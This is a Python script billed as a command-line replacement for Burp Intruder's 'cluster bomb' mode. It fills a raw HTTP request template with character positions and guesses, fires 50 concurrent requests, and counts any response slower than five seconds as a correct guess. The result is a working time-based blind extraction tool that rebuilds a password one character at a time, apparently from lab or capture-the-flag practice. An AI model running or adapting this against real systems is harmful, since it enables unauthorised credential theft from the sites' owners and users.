import argparse
import requests
import concurrent.futures
import time
import threading


def parse_request(request):
    try:
        req_line = request.split('\n')[0]
        method, endpoint = req_line.split(' ')[:2]
    except:
        raise ValueError("missing request line!")
    lines = request.split('\n')[1:]
    if lines:
        headers = {}
        body = None
        index = -1

        for i in range(len(lines)):
            if ':' in lines[i]:
                key, value = lines[i].split(': ')
                headers[key] = value
                index = i

        try:
            body = '\n'.join(filter(None, lines[(index + 1):]))
            if body == '':
                body = None
        except:
            pass  # no body

        try:
            url = 'https://' + headers['Host'] + endpoint
        except KeyError:
            raise KeyError('missing Host header')
    return method, url, headers, body


def decide(template):
    method, url, headers, body = parse_request(template)

    # check delay
    start = time.time()
    if method.upper() == 'GET':
        response = requests.get(url, headers=headers, allow_redirects=True)
    else:
        response = requests.post(url, headers=headers, data=body, allow_redirects=True)
    end = time.time()

    response.raise_for_status()

    return end - start > 5


def send_req(attempt):
    """ tuple representing the current cluster_bomb payload.
    all tests for responses should be implemented inside the decide function."""

    req = request_template.replace('CLUSTER0', str(attempt[0])).replace('CLUSTER1', str(attempt[1]))

    if decide(req):
        with password_lock:
            password[(attempt[0] - 1)] = attempt[1]
        print(f"[+] {attempt}")


chars = 'abcdefghijklmnopqrstuvwxyz0123456789'

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Cluster Bomb - command line alternative to intruder')
    parser.add_argument('request_file', type=str, help='Path to request file. replace parameter 0 and 1 with CLUSTER0 and CLUSTER1 respectively.')
    args = parser.parse_args()

    global request_template
    with open(args.request_file, 'r') as f:
        request_template = f.read()

    global password
    password = {}

    password_lock = threading.Lock()

    for i in range(1, 21):
        payload = [(i, char) for char in chars]
        with concurrent.futures.ThreadPoolExecutor(50) as executor:
            executor.map(send_req, payload)

    print(password)
